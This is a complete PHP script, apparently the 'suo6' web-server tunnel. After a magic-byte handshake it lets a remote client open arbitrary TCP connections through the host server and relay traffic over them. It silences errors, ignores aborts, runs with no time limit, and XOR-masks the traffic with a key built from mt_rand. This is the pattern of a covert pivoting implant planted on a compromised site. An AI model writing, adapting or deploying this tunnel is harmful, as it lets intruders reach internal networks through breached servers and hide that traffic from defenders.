<?php
/**
 * suo6 — multiplexed binary tunnel (PHP edition).
 * Frame: [stream_id:2B BE][type:1B][length:2B BE][payload:length B]
 * Types: 0x01=OPEN 0x02=OPEN_ACK 0x03=DATA 0x04=FIN 0x05=PING
 *
 * Single-threaded non-blocking event loop using stream_select().
 * Requires: PHP 5.6+, non-blocking stream support.
 */
ignore_user_abort(true);
set_time_limit(0);
error_reporting(0);

@ini_set('zlib.output_compression', 0);
ob_implicit_flush(true);
while (ob_get_level()) ob_end_clean();

header('X-Accel-Buffering: no');
header('Cache-Control: no-cache, no-store');
header('Content-Type: application/octet-stream');

// ── constants ──────────────────────────────────────────────────────────────
define('T_OPEN',     0x01);
define('T_OPEN_ACK', 0x02);
define('T_DATA',     0x03);
define('T_FIN',      0x04);
define('T_PING',     0x05);

// ── helpers ────────────────────────────────────────────────────────────────
function s6ReadFull($fd, $n) {
    $buf = '';
    while (strlen($buf) < $n) {
        $chunk = fread($fd, $n - strlen($buf));
        if ($chunk === false || $chunk === '') throw new Exception('EOF');
        $buf .= $chunk;
    }
    return $buf;
}

function s6BuildRaw($sid, $typ, $payload) {
    return pack('nCn', $sid, $typ & 0xff, strlen($payload)) . $payload;
}

function s6XorStr($data, $key, &$pos) {
    $len = strlen($data);
    $out = '';
    for ($i = 0; $i < $len; $i++) {
        $out .= chr(ord($data[$i]) ^ ord($key[$pos++ & 15]));
    }
    return $out;
}

function s6WriteFrame($frame, $key, &$s2cPos) {
    echo s6XorStr($frame, $key, $s2cPos);
    flush();
}

// ── handshake ──────────────────────────────────────────────────────────────
$httpIn = fopen('php://input', 'r');
stream_set_blocking($httpIn, true);
stream_set_read_buffer($httpIn, 0);

try {
    $magic = s6ReadFull($httpIn, 4);
} catch (Exception $e) { exit; }
if ($magic !== "\x53\x36\x00\x01") exit;

try { $clientSeed = s6ReadFull($httpIn, 16); } catch (Exception $e) { exit; }

$serverSeed = '';
for ($i = 0; $i < 16; $i++) $serverSeed .= chr(mt_rand(0, 255));

$key = '';
for ($i = 0; $i < 16; $i++) $key .= chr(ord($clientSeed[$i]) ^ ord($serverSeed[$i]));

echo "\x53\x36\x00\x01" . $serverSeed;
flush();

// Switch HTTP input to non-blocking for event loop
stream_set_blocking($httpIn, false);

// ── session state ──────────────────────────────────────────────────────────
$s2cPos  = 0;
$c2sPos  = 0;
$c2sBuf  = '';      // raw (undecoded) bytes buffered from HTTP input
$c2sHdr  = null;    // decoded frame header [sid, typ, len] or null
$sockets = array(); // sid => stream resource
$done    = false;

// ── event loop ─────────────────────────────────────────────────────────────
while (!$done) {
    if (connection_aborted()) break;

    // Build fd sets for stream_select
    $readFds = array($httpIn);
    foreach ($sockets as $sock) {
        if (is_resource($sock)) $readFds[] = $sock;
    }
    $writeFds  = null;
    $exceptFds = null;

    $n = @stream_select($readFds, $writeFds, $exceptFds, 0, 50000); // 50 ms
    if ($n === false) break;

    foreach ($readFds as $fd) {
        if ($fd === $httpIn) {
            // ── read from HTTP request body ────────────────────────────
            $chunk = @fread($fd, 65536);
            if ($chunk === false) { $done = true; break; }
            $c2sBuf .= $chunk;

            // Parse as many complete frames as possible
            while (true) {
                if ($c2sHdr === null) {
                    if (strlen($c2sBuf) < 5) break;
                    $rawHdr  = substr($c2sBuf, 0, 5);
                    $c2sBuf  = substr($c2sBuf, 5);
                    $hdr     = s6XorStr($rawHdr, $key, $c2sPos);
                    $parts   = unpack('nS/Ct/nL', $hdr);
                    $c2sHdr  = array($parts['S'], $parts['t'], $parts['L']);
                }

                list($sid, $typ, $len) = $c2sHdr;

                if (strlen($c2sBuf) < $len) break;

                $rawPay  = substr($c2sBuf, 0, $len);
                $c2sBuf  = substr($c2sBuf, $len);
                $payload = $len > 0 ? s6XorStr($rawPay, $key, $c2sPos) : '';
                $c2sHdr  = null;

                // Dispatch frame
                switch ($typ) {
                    case T_PING:
                        s6WriteFrame(s6BuildRaw(0, T_PING, ''), $key, $s2cPos);
                        break;

                    case T_OPEN:
                        if (strlen($payload) < 3) break;
                        $port = (ord($payload[0]) << 8) | ord($payload[1]);
                        $host = substr($payload, 2);
                        $sock = @stream_socket_client(
                            "tcp://{$host}:{$port}", $errno, $errstr, 10,
                            STREAM_CLIENT_CONNECT
                        );
                        if (!$sock) {
                            s6WriteFrame(s6BuildRaw($sid, T_OPEN_ACK, "\x01"), $key, $s2cPos);
                        } else {
                            stream_set_blocking($sock, false);
                            stream_set_read_buffer($sock, 0);
                            $sockets[$sid] = $sock;
                            s6WriteFrame(s6BuildRaw($sid, T_OPEN_ACK, "\x00"), $key, $s2cPos);
                        }
                        break;

                    case T_DATA:
                        if (isset($sockets[$sid]) && is_resource($sockets[$sid]) && strlen($payload) > 0) {
                            $written = @fwrite($sockets[$sid], $payload);
                            if ($written === false) {
                                @fclose($sockets[$sid]);
                                unset($sockets[$sid]);
                                s6WriteFrame(s6BuildRaw($sid, T_FIN, ''), $key, $s2cPos);
                            }
                        }
                        break;

                    case T_FIN:
                        if (isset($sockets[$sid])) {
                            @fclose($sockets[$sid]);
                            unset($sockets[$sid]);
                        }
                        break;
                }
            }

        } else {
            // ── read from a target socket ──────────────────────────────
            $sid = array_search($fd, $sockets, true);
            if ($sid === false) continue;

            $data = @fread($fd, 8192);
            if ($data === false || $data === '' || @feof($fd)) {
                s6WriteFrame(s6BuildRaw($sid, T_FIN, ''), $key, $s2cPos);
                @fclose($fd);
                unset($sockets[$sid]);
            } else {
                s6WriteFrame(s6BuildRaw($sid, T_DATA, $data), $key, $s2cPos);
            }
        }
    }
}

// ── cleanup ────────────────────────────────────────────────────────────────
foreach ($sockets as $sock) @fclose($sock);
@fclose($httpIn);
